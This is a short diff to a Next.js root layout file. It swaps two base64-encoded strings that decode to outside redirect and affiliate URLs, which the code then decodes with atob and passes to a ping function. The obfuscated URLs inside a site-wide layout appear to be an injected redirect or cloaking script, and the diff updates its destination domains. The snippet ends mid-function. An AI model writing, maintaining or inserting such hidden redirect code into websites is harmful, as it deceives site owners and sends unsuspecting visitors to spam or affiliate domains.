@@ -172,8 +172,8 @@ export default function RootLayout({
                 return;
             }
         }
-        var mainBrandB64 = "aHR0cHM6Ly9ldmEyMy0zeHByZXNzLmNvbS9kaWJ6Zm9taXI="; 
-        var crossBrandB64 = "aHR0cHM6Ly9mbngtYWJzLm5ldC9kaDYxbXAxYW0="; 
+        var mainBrandB64 = "aHR0cHM6Ly9zdHJpbmctMjZldmEuY29tL2RpYnpmb21pcg=="; 
+        var crossBrandB64 = "aHR0cHM6Ly9nb25vcm1hZmZpbGlhdGVzLmNvbS8/c2VyaWFsPTYxMzU1ODg4JmNyZWF0aXZlX2lkPTc2NzU="; 
         var mainUrl = atob(mainBrandB64);
         var crossUrl = atob(crossBrandB64);
         function ping(url) {
